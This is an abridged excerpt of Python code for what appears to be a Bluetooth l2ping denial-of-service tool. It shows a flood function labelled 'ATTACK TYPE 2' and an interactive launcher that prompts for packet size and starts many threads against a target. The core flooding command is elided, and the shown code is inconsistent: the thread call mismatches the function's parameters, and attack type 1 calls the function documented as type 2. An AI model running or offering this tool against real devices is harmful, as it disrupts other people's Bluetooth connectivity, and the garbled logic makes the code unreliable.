...
def l2pingDOS(id, target, packetsize=str(600)):
    """
    --- ATTACK TYPE 2 ---
...
def interactive():
    ...
    # Choose packetSize
    while packetSize == 600:
        packetSize = input("Packet Size <Default 600>: ")
        if packetSize == "" or not packetSize.isdigit():
            packetSize = 600
            break
    ...
    for _ in range(0, numThreads):
        if attackType == 1:
            ...
            threading.Thread(target=l2pingDOS, args=[str(target), str(packetSize)]).start()
